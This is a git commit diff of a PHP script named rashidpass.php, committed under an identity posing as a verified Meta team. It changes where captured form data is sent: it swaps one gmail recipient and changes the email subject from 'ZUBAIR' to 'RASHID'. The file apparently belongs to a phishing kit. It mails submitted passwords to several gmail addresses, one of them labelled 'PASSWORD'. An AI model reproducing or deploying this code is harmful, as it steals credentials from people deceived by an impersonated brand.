eb4fa730b7c48e85ea2b40d191387041c01715d1
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-08-02 17:49:48 +0800

    Update and rename zubairpass.php to rashidpass.php

--- rashidpass.php
+++ rashidpass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
         $mail->addAddress('approval.ads.monica.ramey@gmail.com');
-        $mail->addAddress('zubairnizamani1234567@gmail.com');
+        $mail->addAddress('elianazoeyzoey@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ZUBAIR';
+        $mail->Subject = 'RASHID';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
